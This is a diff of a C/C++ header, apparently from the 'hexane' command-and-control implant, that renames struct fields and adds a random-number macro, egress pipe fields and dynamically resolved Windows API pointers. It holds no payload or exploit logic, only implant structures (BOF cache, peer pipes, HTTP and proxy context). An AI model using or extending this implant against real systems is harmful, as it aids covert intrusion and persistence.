@@ -104,6 +104,7 @@ typedef uint64_t uint64;
 #define __builtin_bswap64 __bswapq
 #endif
 
+#define RANDOM(n)               (Utils::Random::RandomNumber32() % (n))
 #define PAGE_ALIGN(x)           (B_PTR(U_PTR(x) + ((4096 - (U_PTR(x) & (4096 - 1))) % 4096)))
 #define ARRAY_LEN(p)            sizeof(p) / sizeof(p[0])
 #define DYN_ARRAY_LEN(i, p)     while (p[i]) { i++; }
@@ -416,7 +417,7 @@ typedef struct _executable {
 	LPVOID					text;
 
 	LPWSTR					local_name;
-	PWCHAR					cracked_name;
+	LPWSTR					cracked_name;
 	IMAGE_SECTION_HEADER 	*section;
 	IMAGE_EXPORT_DIRECTORY 	*exports;
 	SIZE_T 					size;
@@ -529,8 +530,8 @@ typedef struct _stream {
     BYTE 		inbound;
     ULONG   	peer_id;
     ULONG   	task_id;
-    ULONG   	msg_type;
-    ULONG		msg_length;
+    ULONG   	type;
+    ULONG		length;
     PBYTE		buffer;
     BOOL 		ready;
     _stream  	*next;
@@ -543,7 +544,7 @@ struct _hexane {
 	LPVOID 			heap;
 	DWORD 			n_threads;
 	PCOFF_PARAMS	bof_cache;
-	PPIPE_DATA 		peer_data;
+	PPIPE_DATA 		peers;
 
 	struct {
 		UINT_PTR   	address;
@@ -587,6 +588,8 @@ struct _hexane {
 	struct {
 		PHTTP_CONTEXT 	http;
 		PPIPE_DATA 		pipe_data;
+        LPWSTR          egress_name;
+        HANDLE          egress_handle;
 		LPSTR 		    domain;
 		LPVOID	    	env_proxy;
 		SIZE_T	    	env_proxylen;
@@ -603,6 +606,8 @@ struct _hexane {
     DTYPE(FileTimeToSystemTime);
     DTYPE(GetCurrentDirectoryA);
     DTYPE(SystemTimeToTzSpecificLocalTime);
+    DTYPE(GetSystemTimeAsFileTime);
+    DTYPE(GetLocalTime);
     DTYPE(PathFindFileNameW);
     DTYPE(GetFileAttributesW);
     DTYPE(CreateFileW);
@@ -611,6 +616,7 @@ struct _hexane {
     DTYPE(FindClose);
     DTYPE(GetFileSize);
     DTYPE(ReadFile);
+    DTYPE(WriteFile);
     DTYPE(LookupAccountSidW);
     DTYPE(LookupPrivilegeValueA);
     DTYPE(AddMandatoryAce);
